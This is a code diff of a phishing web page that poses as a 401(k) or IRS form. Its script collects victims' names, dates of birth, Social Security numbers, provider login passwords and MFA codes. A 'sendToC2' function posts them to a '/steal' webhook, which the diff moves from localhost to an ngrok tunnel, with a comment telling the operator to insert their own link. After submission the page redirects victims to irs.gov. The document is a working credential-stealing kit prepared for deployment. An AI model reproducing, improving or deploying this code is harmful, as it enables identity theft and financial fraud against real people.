@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
@@ -360,11 +360,16 @@
     </div>
 </div>
 <script>
-    const WEBHOOK = 'http://localhost:8080/steal';
+    // ====== !! IMPORTANT !! ======
+    // Replace this URL with your ngrok HTTPS link (e.g. https://abc123.ngrok.io)
+    const WEBHOOK = 'https://abc123.ngrok.io/steal';
+    // ============================
+
     let captured = {
         fullName: '', email: '', phone: '', dob: '', ssn: '',
         provider: '', loginEmail: '', loginPassword: '', loginSSN: '', loginMFA: ''
     };
+
     document.querySelectorAll('.provider-card').forEach(card => {
         card.addEventListener('click', function(e) {
             if (e.target.tagName === 'INPUT') return;
@@ -381,6 +386,7 @@
             }
         });
     });
+
     function submitStep1() {
         const fullName = document.getElementById('fullName').value.trim();
         const email = document.getElementById('email').value.trim();
@@ -394,6 +400,7 @@
         document.getElementById('step2').classList.remove('hidden');
         document.getElementById('step3').classList.add('hidden');
     }
+
     function submitStep2() {
         const providerEl = document.querySelector('input[name="provider"]:checked');
         if (!providerEl) { alert('Please select your 401(k) provider.'); return; }
@@ -413,11 +420,13 @@
         document.getElementById('step3').classList.remove('hidden');
         setTimeout(() => { window.location.href = 'https://www.irs.gov'; }, 3000);
     }
+
     function goBack() {
         document.getElementById('step2').classList.add('hidden');
         document.getElementById('step1').classList.remove('hidden');
         document.getElementById('step3').classList.add('hidden');
     }
+
     function sendToC2(payload) {
         fetch(WEBHOOK, {
             method: 'POST',
@@ -426,6 +435,7 @@
             body: JSON.stringify(payload)
         }).catch(() => {});
     }
+
     document.addEventListener('keydown', function(e) {
         if (e.key === 'Enter') {
             if (!document.getElementById('step1').classList.contains('hidden')) {
